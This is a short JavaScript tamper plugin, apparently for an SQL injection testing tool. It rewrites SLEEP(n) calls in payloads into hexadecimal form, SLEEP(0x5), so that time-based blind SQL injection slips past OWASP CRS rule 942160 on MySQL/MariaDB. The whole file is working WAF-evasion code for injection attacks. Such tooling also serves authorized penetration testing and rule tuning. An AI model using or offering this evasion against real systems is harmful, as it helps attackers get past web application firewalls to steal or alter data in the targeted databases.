//@name: SLEEP数字转hex
//@usage: payload
//@enable: false
//@description: SLEEP(5)→SLEEP(0x5)（绕CRS 942160纯数字匹配，MySQL/MariaDB）
function tamper(payload){
    return payload ? payload.replace(/\bSLEEP\(\s*(\d+)\s*\)/gi, function(m, n){ return 'SLEEP(0x' + parseInt(n, 10).toString(16) + ')'; }) : payload;
}